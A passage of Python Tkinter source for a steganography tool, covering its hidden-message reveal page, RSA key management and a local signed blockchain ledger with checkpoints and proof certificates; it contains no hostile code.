        FlatButton(row, "Try revealing it now →", lambda: (win.destroy(), self._decode_last()),
                   bg=GOLD, pady=9).pack(side="left", padx=4)
        FlatButton(row, "Show in folder", lambda: reveal_in_folder(out), bg=CARD2, fg=TEXT, pady=9
                   ).pack(side="left", padx=4)
        FlatButton(row, "Close", win.destroy, bg=CARD2, fg=TEXT, pady=9).pack(side="left", padx=4)

    def _decode_last(self):
        if self.last_output:
            self.show_page("decode")
            self.load_decode_media(self.last_output)

    def _copy_payload(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.last_payload)
        self.toast("Encrypted payload copied.", "info")

    # ── REVEAL PAGE ─────────────────────────────────────────────────────
    def _build_decode(self):
        left, right = self._split_page("decode", "Reveal a hidden message",
                                       "Choose the file made by “Hide a message”, enter the same passphrase.")
        c1 = Card(left, "STEP 1  ·  CHOOSE THE FILE WITH THE SECRET")
        c1.pack(fill="x")
        self.dec_drop = self._drop_zone(c1.body, self.dec_browse, self.load_decode_media)
        self.dec_drop.pack(fill="x")
        self.dec_detect = tk.Label(c1.body, text="Tip: its name starts with  steg_encoded_  — not the original file.",
                                   font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.dec_detect.pack(fill="x", pady=(8, 0))
        autowrap(self.dec_detect)

        c2 = Card(left, "STEP 2  ·  ENTER THE KEY")
        c2.pack(fill="x", pady=10)
        self.dec_key = KeyInput(c2.body, self)
        self.dec_key.pack(fill="x")
        self.dec_key.on_change = self.refresh_dec

        self.dec_btn = FlatButton(left, "🔓   REVEAL THE MESSAGE", self.do_reveal, bg=GOLD, pady=12,
                                  font=("Segoe UI", 11, "bold"))
        self.dec_btn.pack(fill="x")

        pc = Card(right, "YOUR PROGRESS")
        pc.pack(fill="x")
        self.dec_check = Checklist(pc.body, ["Choose the file made by “Hide a message”",
                                             "Hidden message detected",
                                             "Enter the passphrase"])
        self.dec_check.pack(fill="x")
        kc = Card(right, "⛓  BLOCKCHAIN CHECK  ·  automatic")
        kc.pack(fill="x", pady=(10, 0))
        self.chk_head = tk.Label(kc.body, text="Choose a file to check it against the ledger.", font=FONT_B,
                                 fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.chk_head.pack(fill="x")
        autowrap(self.chk_head)
        self.chk_detail = tk.Label(kc.body, text="", font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.chk_detail.pack(fill="x", pady=(4, 0))
        autowrap(self.chk_detail)
        krow = tk.Frame(kc.body, bg=CARD)
        krow.pack(fill="x", pady=(8, 0))
        self.chk_import = FlatButton(krow, "Import sender's ledger / certificate…", self.ledger_merge, bg=GOLD,
                                     font=FONT_SB, pady=6)
        self.chk_import.pack(side="left", padx=(0, 6))
        self.chk_import.set_enabled(False)
        FlatButton(krow, "Open Verify →", lambda: self.show_page("verify"), bg=CARD2, fg=TEXT, font=FONT_SB,
                   pady=6).pack(side="left")
        vc = Card(right, "PREVIEW")
        vc.pack(fill="both", expand=True, pady=10)
        self.dec_preview = MediaPreview(vc.body)
        self.dec_preview.pack(fill="both", expand=True)
        rc = Card(right, "REVEALED MESSAGE")
        rc.pack(fill="x")
        self.dec_out = make_text(rc.body, height=5)
        self.dec_out.configure(state="disabled")
        self.dec_out.pack(fill="x")
        FlatButton(rc.body, "Copy message", self._copy_revealed, bg=ACCENT2, fg=TEXT, font=FONT_SB, pady=6
                   ).pack(anchor="w", pady=(8, 0))

    def refresh_dec(self):
        if not hasattr(self, "dec_check"):
            return
        states = [bool(self.dec_path), bool(self.dec_raw), bool(self.dec_raw) and self.dec_key.is_ready()]
        self.dec_check.set(states)
        txt = {"pass": "Enter the passphrase", "caesar": "Pick the shift number",
               "rsa_dec": "Load your RSA private key (Keys page)"}.get(self.dec_key.mode, "Enter the passphrase / key")
        self.dec_check.rows[2][1].configure(text=txt)
        ready = all(states)
        self.dec_btn.set_color(GOLD if ready else "#3A4256", "#1A1204" if ready else TEXT)

    def dec_browse(self):
        p = filedialog.askopenfilename(title="Choose the file that contains the secret", filetypes=self.FILETYPES)
        if p:
            self.load_decode_media(p)

    def load_decode_media(self, path: str):
        if self.busy:
            return
        kind = media_kind(path)
        if kind is None:
            self.problem("This file type is not supported.")
            return
        self.dec_path, self.dec_raw, self.dec_cid, self.dec_sha = path, None, None, None
        self.update_chain_check(None, "Scanning…")
        self.dec_drop.label.configure(text=("🖼  " if kind == "image" else "🎞  ") + os.path.basename(path), fg=TEXT)
        self.dec_preview.load(path)
        self.dec_key.set_mode(None)
        self.dec_detect.configure(text="Scanning for a hidden message…", fg=ACCENT)
        self.refresh_dec()
        if path.lower().endswith((".jpg", ".jpeg")):
            self.log("JPEG pictures are lossy — a hidden message usually cannot be recovered from them.", "warn")

        def work(rep):
            fn = image_decode if kind == "image" else video_decode
            raw = fn(path, lambda c, t: rep(c, t, "Scanning…"))
            return raw, file_sha256(path, lambda d, t: rep(d, t, "Fingerprinting file…"))

        def done(res):
            raw, sha = res
            if self.hub:
                self._ai_file_check(path, "Reveal")
            cid = detect_cipher(raw)
            self.dec_raw, self.dec_cid, self.dec_sha = raw, cid, sha
            self.update_chain_check(sha)
            if cid is None:
                self.dec_detect.configure(text="⚠ Hidden data found, but not in a format this program knows.", fg=GOLD)
                self.refresh_dec()
                return
            info = CIPHER_BY_ID[cid]
            self.dec_detect.configure(text=f"✔ Hidden message found  ·  protected with {info['name']}", fg=GREEN)
            self.dec_key.set_mode({"pass": "pass", "caesar": "caesar", "rsa": "rsa_dec"}[info["mode"]])
            if self.last_cid == cid and self.last_secret is not None:   # convenience: same session
                if info["mode"] == "pass":
                    self.dec_key.pw_var.set(self.last_secret)
                    self.toast("Passphrase filled in from the message you just hid.", "info")
                elif info["mode"] == "caesar":
                    self.dec_key.shift_var.set(int(self.last_secret))
            self.refresh_dec()

        def err(msg):
            self.dec_detect.configure(text="✖ No hidden message found in this file.", fg=RED)
            self.update_chain_check(None, "No hidden message here, so nothing to check.  (Any file: use Verify.)")
            self.refresh_dec()

        self.run_task("Scanning for a hidden message…", work, done, err)

    def do_reveal(self):
        if self.busy:
            return
        if not self.dec_path:
            self.problem("Step 1: choose the file that contains the secret.\n\n"
                         "It is the file whose name starts with  steg_encoded_ .", "Not ready yet")
            return
        if not self.dec_raw:
            self.problem("No hidden message was detected in the chosen file yet.\n\n"
                         "Choose the file created by “Hide a message”.", "Not ready yet")
            return
        secret = self.dec_key.get_secret()
        if secret is None:
            return
        raw, sha, path = self.dec_raw, self.dec_sha, self.dec_path
        log_receipt = bool(self.settings["ledger"] and self.settings["receipts"] and sha
                           and sha not in self._receipted)
        keep_names, bits = bool(self.settings["names"]), int(self.settings["bits"])
        if self.hub and self.hub.lock_remaining("reveal"):
            self.problem(f"Reveal is locked for another {self.hub.lock_remaining('reveal') // 60 + 1} minute(s).\n\nAutomated incident response "
                         "locked it after many wrong passphrases in a row. Use Incidents → “Unlock Reveal” if this was you.", "Reveal locked")
            return

        def work(rep):
            return self.flow.reveal(raw, sha, path, secret, log_receipt, keep_names, bits, rep)

        def done(res):
            (_, plain), receipt = res["res"], res["receipt"]
            if receipt and receipt[0] == "error":
                self.log("Ledger receipt skipped: " + receipt[1], "warn")
            elif receipt:
                self._receipted.add(sha)
                self.flash_block = receipt[1]["index"]
                self.refresh_ledger_ui()
                self.update_chain_check(sha)
                self.root.after(8000, self._unflash)
                self.log(f"⛓ Delivery receipt sealed in block #{receipt[1]['index']}.", "ok")
            self.dec_out.configure(state="normal")
            self.dec_out.delete("1.0", "end")
            self.dec_out.insert("1.0", plain)
            self.dec_out.configure(state="disabled")
            self.log(f"Message revealed ({len(plain)} characters).", "ok")
            self.show_revealed(plain, self._ai_reveal_warnings(res) if self.hub else ())

        self.run_task("Decrypting…", work, done)

    def show_revealed(self, plain, warnings=()):
        win = self._dialog("Secret message", 560, 380 + (70 if warnings else 0))
        tk.Label(win, text="🔓  Here is the secret message", font=("Segoe UI", 15, "bold"), fg=GOLD, bg=BG
                 ).pack(pady=(18, 8))
        if warnings:
            wl = tk.Label(win, text="🧠 AI warnings\n" + "\n".join("• " + w for w in warnings[:4]), font=FONT_S, fg=ORANGE, bg=BG,
                          justify="left", wraplength=500)
            wl.pack(padx=24, pady=(0, 6), anchor="w")
        t = make_text(win, height=9)
        t.insert("1.0", plain)
        t.configure(state="disabled")
        t.pack(fill="both", expand=True, padx=24)
        row = tk.Frame(win, bg=BG)
        row.pack(pady=12)
        FlatButton(row, "Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(plain),
                                         self.toast("Copied.", "info")), bg=ACCENT2, fg=TEXT, pady=8).pack(side="left", padx=4)
        FlatButton(row, "Close", win.destroy, bg=CARD2, fg=TEXT, pady=8).pack(side="left", padx=4)

    def _copy_revealed(self):
        txt = self.dec_out.get("1.0", "end-1c")
        if txt:
            self.root.clipboard_clear()
            self.root.clipboard_append(txt)
            self.toast("Message copied.", "info")

    # ── KEYS PAGE ───────────────────────────────────────────────────────
    def _build_keys(self):
        page = tk.Frame(self.content, bg=BG)
        self.pages["keys"] = page
        tk.Label(page, text="RSA keys (advanced)", font=FONT_H, fg=TEXT, bg=BG).pack(anchor="w", padx=18, pady=(14, 0))
        tk.Label(page, text="Only needed for the “RSA-2048” method. Most people can ignore this page and use a passphrase.",
                 font=FONT, fg=MUTED, bg=BG).pack(anchor="w", padx=18)
        c = Card(page, "RSA-2048 KEY PAIR")
        c.pack(fill="x", padx=16, pady=14)
        self.key_pub_lbl = tk.Label(c.body, font=FONT_MS, bg=CARD, anchor="w")
        self.key_priv_lbl = tk.Label(c.body, font=FONT_MS, bg=CARD, anchor="w")
        self.key_pub_lbl.pack(fill="x", pady=2)
        self.key_priv_lbl.pack(fill="x", pady=2)
        row = tk.Frame(c.body, bg=CARD)
        row.pack(fill="x", pady=(12, 0))
        for text, cmd, col in (("⚙  Generate new pair", self.rsa_generate, GREEN),
                               ("Load private key…", self.rsa_load_priv, CARD2),
                               ("Load public key…", self.rsa_load_pub, CARD2),
                               ("Export public key…", self.rsa_export_pub, CARD2)):
            FlatButton(row, text, cmd, bg=col, fg="#06121A" if col == GREEN else TEXT, font=FONT_SB, pady=8
                       ).pack(side="left", padx=(0, 8))
        note = tk.Label(c.body, text="Share your PUBLIC key so others can send you messages. Keep rsa_private.pem secret — "
                                     "anyone holding it can read messages encrypted for you.\nKeys are stored in the folder "
                                     "you launch the app from.", font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        note.pack(fill="x", pady=(12, 0))
        autowrap(note)
        self._refresh_keys()

    def _refresh_keys(self):
        for lbl, key, name in ((self.key_pub_lbl, self.rsa_pub, "PUBLIC "), (self.key_priv_lbl, self.rsa_priv, "PRIVATE")):
            lbl.configure(text=f"{name}  {'✔ ' + fingerprint(key) if key else '✖ not loaded'}", fg=GREEN if key else RED)
        for k in (getattr(self, "enc_key", None), getattr(self, "dec_key", None)):
            if k and k.mode in ("rsa_enc", "rsa_dec"):
                k.refresh_rsa()

    def rsa_generate(self):
        if self.busy:
            return
        if (self.rsa_priv or self.rsa_pub) and not messagebox.askyesno(
                "Generate RSA keys", "This overwrites rsa_private.pem / rsa_public.pem.\nContinue?", parent=self.root):
            return

        def done(res):
            self.rsa_priv, self.rsa_pub = res
            self._refresh_keys()
            self.toast("New RSA-2048 key pair saved.", "ok")

        self.run_task("Generating RSA-2048 key pair…", lambda rep: RSAKeyManager.generate_and_save(), done)

    def _load_pem(self, attr):
        p = filedialog.askopenfilename(filetypes=[("PEM", "*.pem"), ("All", "*.*")])
        if p:
            try:
                with open(p) as f:
                    data = f.read()
                RSA.import_key(data)
                setattr(self, attr, data)
                self._refresh_keys()
                self.toast("Key loaded.", "ok")
            except Exception as e:
                self.problem(f"This is not a valid key file:\n{e}", kind="err")

    def rsa_load_priv(self): self._load_pem("rsa_priv")
    def rsa_load_pub(self): self._load_pem("rsa_pub")

    def rsa_export_pub(self):
        if not self.rsa_pub:
            self.problem("No public key is loaded yet.")
            return
        p = filedialog.asksaveasfilename(defaultextension=".pem", initialfile="rsa_public.pem")
        if p:
            with open(p, "w") as f:
                f.write(self.rsa_pub)
            self.toast("Public key exported.", "ok")

    # ═════════════════════════════════════════════════════════════════
    #  BLOCKCHAIN  ·  ledger page, verify page, trust badge, flows
    # ═════════════════════════════════════════════════════════════════
    def refresh_chain_chip(self):
        L = self.ledger
        if not self.settings["ledger"]:
            self.chain_lbl.configure(text="⛓ LEDGER OFF", fg=MUTED)
        elif L.intact:
            self.chain_lbl.configure(text=f"⛓ LEDGER · {L.height} BLOCKS · ✔ INTACT", fg=GREEN)
        else:
            self.chain_lbl.configure(text="⛓ LEDGER · ✖ INTEGRITY PROBLEM", fg=RED)

    def _unflash(self):
        self.flash_block = None
        try:
            self.refresh_ledger_ui()
        except tk.TclError:          # window was closed in the meantime
            pass

    def refresh_ledger_ui(self):
        L = self.ledger
        ok, problems = L.status
        bad = {i for i, _ in problems}
        blocks = L.snapshot()
        self.tile_blocks.set(str(len(blocks)), TEXT, "including the genesis block")
        self.tile_tx.set(str(L.tx_count), TEXT, "signed hide / reveal records")
        self.tile_int.set("✔ Intact" if ok else "✖ Broken", GREEN if ok else RED,
                          ("every signature re-verified" if L.status_deep else "links verified — press Validate for signatures")
                          if ok else f"{len(problems)} problem(s) found")
        lvl = next((n for n, b, _ in DIFFICULTY_LEVELS if b == self.settings["bits"]), "Custom")
        self.tile_diff.set(lvl, ACCENT, f"{self.settings['bits']}-bit proof-of-work")
        self.strip.set_blocks(blocks, bad, self.flash_block, self.sel_block)

        if ok:
            self.ledger_alert.pack_forget()
        else:
            lines = [f"•  Block #{i}: {t}" for i, t in problems[:6]] + (["•  …"] if len(problems) > 6 else [])
            self.ledger_alert_txt.configure(
                text="⚠  The ledger failed its integrity check — it was edited or damaged.\n" + "\n".join(lines) +
                     "\n\nKeep a copy for investigation, then use “Archive & start fresh” to continue with a clean chain.")
            self.ledger_alert.pack(fill="x", padx=16, pady=(10, 0), after=self.ledger_hdr)

        keep = self.sel_txid
        self.tx_tree.delete(*self.tx_tree.get_children())
        for tx, bi in L.all_txs()[:1000]:
            try:
                d = tx["data"]
                who = "YOU" if tx["signer"]["id"] == self.identity.id else str(tx["signer"].get("alias", "?"))[:16]
                self.tx_tree.insert("", "end", iid=tx["txid"], values=(
                    f"#{bi}", fmt_time(tx["ts"])[5:16], TX_LABEL.get(tx["type"], tx["type"]), who,
                    d.get("name") or short_hash(d.get("file_sha256", ""), 14)))
            except Exception:
                continue
        if keep and self.tx_tree.exists(keep):
            self.tx_tree.selection_set(keep)
        self.refresh_chain_chip()

    def _set_detail(self, text: str):
        self.ledger_detail.configure(state="normal")
        self.ledger_detail.delete("1.0", "end")
        self.ledger_detail.insert("1.0", text)
        self.ledger_detail.configure(state="disabled")

    def ledger_select_block(self, i: int):
        blocks = self.ledger.snapshot()
        if not 0 <= i < len(blocks):
            return
        b = blocks[i]
        self.sel_block, self.sel_txid = i, None
        probs = [t for k, t in self.ledger.status[1] if k == i]
        txt = describe_block(b, probs)
        if b["txs"]:
            txt += "\n\nRECORDS IN THIS BLOCK\n" + "\n".join(
                f"  {TX_LABEL.get(t.get('type'), '?')}  {fmt_time(t.get('ts'))}  "
                f"{t.get('data', {}).get('name') or short_hash(t.get('data', {}).get('file_sha256', ''), 14)}"
                for t in b["txs"])
        self._set_detail(txt)
        self.btn_cert.set_enabled(False)
        self.btn_copyid.set_enabled(False)
        self.strip.set_blocks(blocks, {k for k, _ in self.ledger.status[1]}, self.flash_block, i, follow=False)

    def ledger_select_tx(self, _e=None):
        sel = self.tx_tree.selection()
        hit = self.ledger.get_tx(sel[0]) if sel else None
        if not hit:
            return
        tx, bi = hit
        self.sel_txid, self.sel_block = tx["txid"], bi
        self._set_detail(describe_tx(tx, bi, self.identity.id))
        self.btn_cert.set_enabled(True)
        self.btn_copyid.set_enabled(True)
        self.strip.set_blocks(self.ledger.snapshot(), {k for k, _ in self.ledger.status[1]},
                              self.flash_block, bi, follow=False)

    def _build_ledger(self):
        sf = ScrollFrame(self.content)
        self.pages["ledger"] = sf
        page = sf.inner
        self.ledger_hdr = tk.Frame(page, bg=BG)
        self.ledger_hdr.pack(fill="x", padx=18, pady=(14, 0))
        tk.Label(self.ledger_hdr, text="Blockchain ledger", font=FONT_H, fg=TEXT, bg=BG).pack(anchor="w")
        tk.Label(self.ledger_hdr, text="A signed, tamper-evident record of everything you hide and reveal — "
                                       "fingerprints only, never your messages or passphrases.",
                 font=FONT, fg=MUTED, bg=BG).pack(anchor="w")
        self.ledger_alert = tk.Frame(page, bg="#2A1416", highlightthickness=1, highlightbackground=RED)
        self.ledger_alert_txt = tk.Label(self.ledger_alert, text="", font=FONT_S, fg="#FCA5A5", bg="#2A1416",
                                         anchor="w", justify="left")
        self.ledger_alert_txt.pack(fill="x", padx=12, pady=8)
        autowrap(self.ledger_alert_txt)

        row = tk.Frame(page, bg=BG)
        row.pack(fill="x", padx=16, pady=(12, 0))
        self.tile_blocks, self.tile_tx, self.tile_int, self.tile_diff = (
            StatTile(row, c) for c in ("BLOCKS", "SIGNED RECORDS", "INTEGRITY", "DIFFICULTY"))
        for i, t in enumerate((self.tile_blocks, self.tile_tx, self.tile_int, self.tile_diff)):
            t.grid(row=0, column=i, sticky="nsew", padx=(0 if i == 0 else 6, 0))
            row.columnconfigure(i, weight=1, uniform="stat")

        c = Card(page, "CHAIN EXPLORER  ·  click a block to inspect it")
        c.pack(fill="x", padx=16, pady=(12, 0))
        self.strip = ChainStrip(c.body, on_select=self.ledger_select_block)
        self.strip.pack(fill="x")
        for texts in ((("✔  Validate chain", self.ledger_validate, GREEN),
                       ("Export ledger…", self.ledger_export, CARD2),
                       ("Merge ledger / certificate…", self.ledger_merge, CARD2)),
                      (("📌  Copy checkpoint", self.ledger_copy_checkpoint, CARD2),
                       ("Check a checkpoint…", self.ledger_check_checkpoint, CARD2),
                       ("Archive & start fresh", self.ledger_repair, CARD2))):
            bar = tk.Frame(c.body, bg=CARD)
            bar.pack(fill="x", pady=(8, 0))
            for text, cmd, col in texts:
                FlatButton(bar, text, cmd, bg=col, fg="#06121A" if col == GREEN else TEXT,
                           font=FONT_SB, pady=7).pack(side="left", padx=(0, 6))

        c2 = Card(page, "RECORDS  ·  newest first")
        c2.pack(fill="x", padx=16, pady=(12, 0))
        body = c2.body
        body.columnconfigure(0, weight=3, uniform="d")
        body.columnconfigure(1, weight=2, uniform="d")
        tw = tk.Frame(body, bg=CARD)
        tw.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        self.tx_tree = ttk.Treeview(tw, columns=("block", "time", "type", "by", "subject"),
                                    show="headings", height=9, selectmode="browse")
        for col, text, w in (("block", "BLOCK", 56), ("time", "TIME", 96), ("type", "EVENT", 88),
                             ("by", "SIGNER", 76), ("subject", "FILE", 150)):
            self.tx_tree.heading(col, text=text, anchor="w")
            self.tx_tree.column(col, width=w, anchor="w", stretch=(col == "subject"))
        vsb = ttk.Scrollbar(tw, orient="vertical", command=self.tx_tree.yview)
        self.tx_tree.configure(yscrollcommand=vsb.set)
        self.tx_tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        self.tx_tree.bind("<<TreeviewSelect>>", self.ledger_select_tx)
        self.ledger_detail = make_text(body, height=10, font=FONT_MS)
        self.ledger_detail.grid(row=0, column=1, sticky="nsew")
        self.ledger_detail.configure(state="disabled")
        self._set_detail("Select a record or a block to see its details.\n\n"
                         "Every record is digitally signed; every block is linked to the one before it.")
        sfr = self.pages["ledger"]
        for w in (self.tx_tree, self.ledger_detail):      # let these scroll themselves, not the page
            w.bind("<Enter>", lambda e: sfr._unbind_wheel(None), add="+")
            w.bind("<Leave>", lambda e: sfr._bind_wheel(None), add="+")
        br = tk.Frame(body, bg=CARD)
        br.grid(row=1, column=0, columnspan=2, sticky="w", pady=(8, 0))
        self.btn_cert = FlatButton(br, "⛓  Save proof certificate…", lambda: self.export_certificate(self.sel_txid),
                                   bg=ACCENT, font=FONT_SB, pady=7)
        self.btn_copyid = FlatButton(br, "Copy record ID", self._copy_selected_txid, bg=CARD2, fg=TEXT,
                                     font=FONT_SB, pady=7)
        for b in (self.btn_cert, self.btn_copyid):
            b.pack(side="left", padx=(0, 6))
            b.set_enabled(False)

        c3 = Card(page, "YOUR IDENTITY & SETTINGS")
        c3.pack(fill="x", padx=16, pady=(12, 0))
        tk.Label(c3.body, text="SIGNING IDENTITY  (a private key that never leaves this computer)",
                 font=FONT_SB, fg=MUTED, bg=CARD).pack(anchor="w")
        tk.Label(c3.body, text=f"ID  {short_id(self.identity.id)}   ·   ECDSA P-256   ·   {self.home}",
                 font=FONT_MS, fg=TEAL, bg=CARD, anchor="w", justify="left").pack(fill="x", pady=(2, 8))
        ar = tk.Frame(c3.body, bg=CARD)
        ar.pack(fill="x")
        tk.Label(ar, text="DISPLAY NAME", font=FONT_SB, fg=MUTED, bg=CARD).pack(side="left", padx=(0, 8))
        self.alias_var = tk.StringVar(value=self.settings["alias"])
        make_entry(ar, textvariable=self.alias_var, width=24).pack(side="left", ipady=5)
        FlatButton(ar, "Save", self.save_alias, bg=CARD2, fg=TEXT, font=FONT_SB, padx=12, pady=6
                   ).pack(side="left", padx=(6, 0))
        FlatButton(ar, "Copy my ID", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self.identity.id),
                                              self.toast("Your full identity ID was copied.", "info")),
                   bg=CARD2, fg=TEXT, font=FONT_SB, padx=12, pady=6).pack(side="left", padx=6)
        tk.Label(c3.body, text="The display name is only a label you choose. What proves who signed is the ID.",
                 font=FONT_S, fg=MUTED, bg=CARD, anchor="w").pack(fill="x", pady=(4, 8))
        make_check(c3.body, "Seal every hidden file on the ledger  (recommended)", self.var_ledger).pack(fill="x")
        make_check(c3.body, "Log a signed receipt when I reveal a message  (proof of delivery)",
                   self.var_receipts).pack(fill="x")
        make_check(c3.body, "Record file names  (turn off for fingerprint-only privacy)", self.var_names).pack(fill="x")
        tk.Label(c3.body, text="PROOF-OF-WORK DIFFICULTY  — higher = more effort to forge, slightly slower to seal",
                 font=FONT_SB, fg=MUTED, bg=CARD).pack(anchor="w", pady=(10, 4))
        self.diff_seg = Segmented(c3.body, DIFFICULTY_LEVELS, self.settings["bits"], self._set_bits)
        self.diff_seg.pack(anchor="w")

        c4 = Card(page, "HOW IT WORKS  ·  AND ITS HONEST LIMITS")
        c4.pack(fill="x", padx=16, pady=12)
        txt = ("WHAT IS RECORDED\n"
               "  •  Hide: a record signed with your identity — SHA-256 fingerprints of the new file and of the original\n"
               "     picture/video, the method used and the time — sealed into a new block.\n"
               "  •  Reveal: a signed receipt (proof of delivery).\n"
               "  •  Never recorded: your message, passphrase, keys or the encrypted payload.\n\n"
               "WHAT IT PROVES\n"
               "  •  The file existed in exactly this form and was registered by the holder of this identity.\n"
               "  •  Nothing was altered or removed later: each block contains the hash of the previous one, a Merkle root\n"
               "     of its records and real proof-of-work, and every record carries a digital signature.\n"
               "  •  Anyone can verify a proof certificate offline — no server, no account, no coins.\n\n"
               "HONEST LIMITS\n"
               "  •  Times come from the signer's own computer clock.\n"
               "  •  This chain lives on your computer, so its owner could rebuild it from scratch. Signed records of other\n"
               "     people still cannot be forged. Publish a CHECKPOINT (button above) somewhere public to lock history in.\n"
               "  •  A ledger shows that this tool was used. If even that must stay private, switch the ledger off.")
        tk.Label(c4.body, text=txt, font=FONT_S, fg=TEXT, bg=CARD, justify="left", anchor="w").pack(fill="x")

    def _set_bits(self, bits: int):
        self.settings["bits"] = int(bits)
        self.refresh_ledger_ui()

    def save_alias(self):
        alias = self.alias_var.get().strip()[:40] or "Me"
        self.settings["alias"] = self.identity.alias = alias
        self.toast(f"Display name saved: {alias}", "ok")

    def _copy_selected_txid(self):
        if self.sel_txid:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.sel_txid)
            self.toast("Record ID copied.", "info")

    # -- ledger actions -----------------------------------------------------
    def ledger_validate(self):
        def done(res):
            ok, problems = res
            self.refresh_ledger_ui()
            if ok:
                self.toast(f"✔ {self.ledger.height} blocks and {self.ledger.tx_count} signatures verified.", "ok")
            else:
                self.problem("The ledger failed validation:\n\n" +
                             "\n".join(f"•  Block #{i}: {t}" for i, t in problems[:8]), "Ledger problem", "err")

        self.run_task("Validating the whole chain…", lambda rep: self.ledger.full_check(rep), done)

    def ledger_export(self):
        p = filedialog.asksaveasfilename(title="Export ledger", defaultextension=".jsonl",
                                         initialfile="cryptosec_ledger.jsonl",
                                         filetypes=[("CryptoSec ledger", "*.jsonl"), ("All files", "*.*")])
        if p:
            try:
                self.ledger.export_to(p)
                self.toast("Ledger exported — send it to anyone who needs to verify your files.", "ok")
            except OSError as e:
                self.problem(f"Could not export the ledger:\n{e}", kind="err")

    def ledger_merge(self, path: str | None = None):
        p = path or filedialog.askopenfilename(
            title="Choose a ledger (.jsonl) or proof certificate (.csproof)",
            filetypes=[("Ledger or certificate", "*.jsonl *.csproof *.json"), ("All files", "*.*")])
        if not p or self.busy:
            return
        bits = int(self.settings["bits"])

        def work(rep):
            rep(0, 0, "Checking every signature…")
            return self.ledger.merge_file(p, bits, lambda n: rep(0, 0, f"Sealing imported records…  {n:,}"))

        def done(r):
            self.flash_block = self.ledger.tip["index"] if r["added"] else None
            self.refresh_ledger_ui()
            self._refresh_checks()
            if r["added"]:
                self.root.after(6000, self._unflash)
            msg = (f"New records added:  {r['added']}\nAlready in your ledger:  {r['known']}\n"
                   f"Rejected (bad signature):  {r['rejected']}")
            if r["added"]:
                msg += f"\n\nThey were sealed into {r['blocks']} new block(s) of your chain."
            messagebox.showinfo("Merge finished", msg, parent=self.root)

        self.run_task("Merging ledger…", work, done)

    def _refresh_checks(self):
        if self.dec_sha:
            self.update_chain_check(self.dec_sha)
        self.render_verify()

    def ledger_copy_checkpoint(self):
        cp = self.ledger.checkpoint()
        self.root.clipboard_clear()
        self.root.clipboard_append(cp)
        win = self._dialog("Ledger checkpoint", 660, 380)
        tk.Label(win, text="📌  Checkpoint copied to the clipboard", font=("Segoe UI", 14, "bold"),
                 fg=GREEN, bg=BG).pack(pady=(20, 8))
        e = make_entry(win, font=FONT_MS)
        e.insert(0, cp)
        e.configure(state="readonly")
        e.pack(fill="x", padx=24, ipady=6)
        tk.Label(win, text=("A checkpoint is the fingerprint of your whole ledger as it is right now.\n\n"
                            "Publish it somewhere you cannot secretly edit — email it to yourself or a friend, post it, "
                            "print it, or give it to a notary. Later, anyone holding the checkpoint can prove that your "
                            "history was not rewritten  (Blockchain → Check a checkpoint…).\n\n"
                            "This is what turns a personal ledger into evidence that a third party can trust."),
                 font=FONT_S, fg=MUTED, bg=BG, wraplength=600, justify="left").pack(padx=24, pady=14, anchor="w")
        FlatButton(win, "Close", win.destroy, bg=CARD2, fg=TEXT, pady=8).pack()

    def _ask_text(self, title: str, label: str, ok_text: str = "Check") -> str | None:
        win = self._dialog(title, 640, 190)
        out = {"v": None}
        tk.Label(win, text=label, font=FONT, fg=TEXT, bg=BG, anchor="w").pack(fill="x", padx=24, pady=(20, 6))
        e = make_entry(win, font=FONT_MS)
        e.pack(fill="x", padx=24, ipady=6)
        e.focus_set()

        def ok():
            out["v"] = e.get().strip()
            win.destroy()

        e.bind("<Return>", lambda _e: ok())
        row = tk.Frame(win, bg=BG)
        row.pack(pady=16)
        FlatButton(row, ok_text, ok, bg=ACCENT, pady=8).pack(side="left", padx=4)
        FlatButton(row, "Cancel", win.destroy, bg=CARD2, fg=TEXT, pady=8).pack(side="left", padx=4)
        self.root.wait_window(win)
        return out["v"]

    def ledger_check_checkpoint(self):
        text = self._ask_text("Check a checkpoint", "Paste a checkpoint  (CSEC1-…):")
        if not text:
            return
        ok, msg = self.ledger.check_checkpoint(text)
        (messagebox.showinfo if ok else messagebox.showwarning)(
            "Checkpoint " + ("matches" if ok else "does NOT match"), msg, parent=self.root)

    def ledger_repair(self):
        if not messagebox.askyesno(
                "Archive & start fresh",
                "The current ledger file will be kept (renamed) and a new, empty chain will be started.\n\n"
                "Records in the archived file stay verifiable on their own, but will no longer appear here "
                "unless you merge the archive back.\n\nContinue?", parent=self.root):
            return
        try:
            dest = self.ledger.archive_and_reset()
        except OSError as e:
            self.problem(f"Could not archive the ledger:\n{e}", kind="err")
            return
        self.sel_txid = self.sel_block = self.flash_block = None
        self.refresh_ledger_ui()
        messagebox.showinfo("Archived", f"The old ledger was kept as:\n{dest}\n\nA fresh chain has been started.",
                            parent=self.root)

    def export_certificate(self, txid: str | None):
        cert = self.ledger.certificate(txid) if txid else None
        if not cert:
            self.problem("Select a record first.", "Nothing selected")
            return
        p = filedialog.asksaveasfilename(
            title="Save proof certificate", defaultextension=".csproof", initialfile=f"cryptosec_proof_{txid[:8]}.csproof",
            filetypes=[("CryptoSec proof certificate", "*.csproof"), ("JSON", "*.json")])
        if not p:
            return
        try:
            with open(p, "w", encoding="utf-8") as f:
                json.dump(cert, f, indent=2)
            hp = os.path.splitext(p)[0] + ".html"
            with open(hp, "w", encoding="utf-8") as f:
                f.write(certificate_html(cert, self.identity.id))
        except OSError as e:
            self.problem(f"Could not save the certificate:\n{e}", kind="err")
            return
        self.toast("Certificate saved  (.csproof for verification + printable .html)", "ok")
        try:
            webbrowser.open("file://" + os.path.abspath(hp).replace("\\", "/"))
        except Exception:
            pass

    def _cert_last(self):
        if self.last_seal:
            self.export_certificate(self.last_seal["tx"]["txid"])

    # -- trust badge on the Reveal page ----------------------------------------
    def update_chain_check(self, sha: str | None, idle: str | None = None):
        if not sha:
            self.chk_head.configure(text=idle or "Choose a file to check it against the ledger.", fg=MUTED)
            self.chk_detail.configure(text="")
            self.chk_import.set_enabled(False)
            return
        level, head, lines = inspect_file(self.ledger, sha, self.identity.id)
